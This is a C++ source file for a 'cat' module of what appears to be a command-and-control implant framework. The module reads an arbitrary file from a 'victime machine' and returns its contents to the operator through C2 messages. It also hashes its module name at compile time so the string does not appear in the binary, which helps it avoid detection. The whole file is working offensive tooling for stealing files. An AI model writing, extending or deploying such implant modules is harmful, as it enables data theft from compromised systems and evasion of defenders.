#include "Cat.hpp"

#include "Common.hpp"

#include <cstring>

using namespace std;


// Compute hash of moduleName at compile time, so the moduleName string don't show in the binary
constexpr std::string_view moduleName = "cat";
constexpr unsigned long moduleHash = djb2(moduleName);

#ifdef _WIN32

__declspec(dllexport) Cat* CatConstructor() 
{
    return new Cat();
}

#endif

Cat::Cat()
#ifdef BUILD_TEAMSERVER
	: ModuleCmd(std::string(moduleName), moduleHash)
#else
	: ModuleCmd("", moduleHash)
#endif
{
}

Cat::~Cat()
{
}

std::string Cat::getInfo()
{
	std::string info;
#ifdef BUILD_TEAMSERVER
	info += "cat:\n";
	info += "Cat a file from victime machine\n";
	info += "exemple:\n";
	info += "- cat c:\\temp\\toto.exe\n";
#endif
	return info;
}

int Cat::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
	if (splitedCmd.size() >= 2 )
	{
		string inputFile;
		for (int idx = 1; idx < splitedCmd.size(); idx++) 
		{
			if(!inputFile.empty())
				inputFile+=" ";
			inputFile+=splitedCmd[idx];
		}

		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}
#endif
	return 0;
}


int Cat::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	c2RetMessage.set_instruction(c2RetMessage.instruction());
	c2RetMessage.set_cmd(c2Message.inputfile());
	c2RetMessage.set_inputfile(c2Message.inputfile());

	std::string inputFile = c2Message.inputfile();
	std::ifstream input(inputFile, std::ios::binary);
	if( input ) 
	{
		std::string buffer(std::istreambuf_iterator<char>(input), {});
		c2RetMessage.set_returnvalue(buffer);
	}
	else
	{
		c2RetMessage.set_returnvalue("Failed: Couldn't open file.");
	}

	return 0;
}

